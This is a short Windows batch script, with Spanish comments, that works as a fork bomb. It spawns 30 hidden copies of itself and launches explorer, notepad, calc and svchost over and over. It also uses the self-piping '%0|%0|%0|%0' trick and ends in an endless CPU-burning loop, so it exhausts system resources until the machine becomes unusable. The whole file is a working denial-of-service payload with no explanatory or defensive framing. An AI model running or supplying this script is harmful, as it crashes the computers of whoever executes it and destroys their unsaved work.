@echo off
REM ========================================
REM PIPE FORK + DUPLICACIÓN MÁS RÁPIDA
REM ========================================
if "%1"=="H" goto :H

REM 30 SPAWNS INICIALES
for /l %%i in (1,1,30) do start /b cmd /c "%~f0" H
exit /b

:H
REM LOOP SIN FIN
:saturacion
REM DUPLICA LEGÍTIMOS
start /b explorer.exe
start /b notepad.exe  
start /b calc.exe
start /b "%windir%\system32\svchost.exe"

REM PIPE EXPLOSIVO
%0|%0|%0|%0

REM CPU DIRECTO
:cpuburn
for /l %%i in (1,1,10000) do set /a x=%%i
goto cpuburn